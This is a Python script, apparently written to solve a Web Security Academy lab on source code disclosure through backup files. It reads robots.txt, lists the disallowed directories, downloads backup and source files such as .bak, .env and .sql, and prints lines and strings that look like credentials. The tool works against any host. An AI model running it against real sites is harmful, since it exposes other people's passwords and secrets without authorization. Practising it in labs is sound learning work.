#!/usr/bin/env python3
# Source code disclosure via backup files — free alternative to Burp Pro's
# "Discover content" engagement tool.
#
# What it does:
#   1. Reads /robots.txt and collects the Disallow paths (the lab hides /backup there).
#   2. Lists each directory and picks files with backup/source extensions.
#   3. Downloads them and prints credential-looking lines and strings.
#
# Usage:
#   python3 find_backup_leaks.py <host>
#
# Example:
#   python3 find_backup_leaks.py 0a7b0052030bba9c8412f9a2002d0039.web-security-academy.net

import re
import sys
import urllib.error
import urllib.parse
import urllib.request

BACKUP_EXTENSIONS = (
    ".bak", ".old", ".orig", ".backup", ".save",
    ".zip", ".tar", ".gz", ".tgz", ".rar", ".7z",
    ".java", ".php", ".py", ".js", ".rb", ".txt", ".sql", ".env",
)

CREDENTIAL_WORDS = re.compile(r"(?i)(password|passwd|pwd|secret|token|api[_-]?key|jdbc|connection|username|user)")


def fetch(url):
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=20) as resp:
        return resp.status, resp.read().decode("utf-8", "replace")


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 find_backup_leaks.py <host>")
        return 1

    host = sys.argv[1].replace("https://", "").replace("http://", "").strip("/")
    base = "https://" + host
    print("Target: %s\n" % base)

    # 1) robots.txt -> Disallow paths
    directories = []
    try:
        _, robots = fetch(base + "/robots.txt")
        directories = re.findall(r"(?im)^Disallow:\s*(\S+)", robots)
        print("[*] robots.txt Disallow paths: %s" % (", ".join(directories) or "none"))
    except Exception as e:
        print("[!] robots.txt not available: %s" % e)

    if not directories:
        directories = ["/backup/"]
        print("[*] falling back to /backup/")

    # 2) list directories and find backup/source files
    found = []
    for directory in directories:
        url = base + "/" + directory.lstrip("/")
        if not url.endswith("/"):
            url += "/"
        try:
            status, listing = fetch(url)
        except urllib.error.HTTPError as e:
            print("[%d] %s" % (e.code, url))
            continue
        except Exception as e:
            print("[!] %s: %s" % (url, e))
            continue

        print("[%d] %s" % (status, url))
        links = re.findall(r"""href=["']?([^"'\s>]+)""", listing)
        files = {link for link in links if link.lower().endswith(BACKUP_EXTENSIONS)}
        for f in sorted(files):
            found.append(urllib.parse.urljoin(url, f))

    if not found:
        print("\n[-] no backup/source files found")
        return 1

    # 3) download and look for credentials
    print("\n[*] downloading %d file(s)\n" % len(found))
    for file_url in found:
        try:
            status, content = fetch(file_url)
        except Exception as e:
            print("[!] %s: %s" % (file_url, e))
            continue

        print("=" * 70)
        print("[%d] %s" % (status, file_url))
        print("=" * 70)

        lines = content.splitlines()
        for i, line in enumerate(lines, 1):
            if CREDENTIAL_WORDS.search(line):
                print("%4d | %s" % (i, line.strip()[:160]))

        strings = re.findall(r"""["']([A-Za-z0-9_\-./]{12,})["']""", content)
        secrets = [s for s in strings if not s.lower().endswith(BACKUP_EXTENSIONS)]
        if secrets:
            print("\n    long quoted strings (possible secrets):")
            for s in dict.fromkeys(secrets):
                print("      - %s" % s)

    return 0


if __name__ == "__main__":
    sys.exit(main())
